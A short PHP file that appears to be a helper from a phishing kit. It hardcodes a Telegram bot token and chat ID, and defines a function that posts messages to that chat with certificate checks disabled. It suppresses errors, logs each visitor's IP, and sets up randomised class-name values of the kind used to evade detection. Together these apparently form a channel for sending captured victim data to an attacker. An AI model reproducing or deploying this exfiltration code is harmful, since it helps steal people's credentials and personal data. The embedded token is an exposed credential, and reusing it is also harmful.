<?php
error_reporting(0);
session_start();

define("TOKEN", '8712281940:AAF7RQkUscdeFPocXnJj8-Db7sxeU4L2AiU');
define("CHAT_ID", '-5296860240');

$ip = get_user_ip();

$rendom_classes = rand(0, 1000000); 
$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

function telegram_message($message, $keyboard)
{
    $data = array(
        "chat_id" => CHAT_ID,
        "text" => $message,
        "reply_markup" => $keyboard
    );

    $website_telegram = "https://api.telegram.org/bot" . TOKEN;
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

function get_user_ip()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if ($ip == '::1') {
        return '127.0.0.1';
    }

    return $ip;
}


?>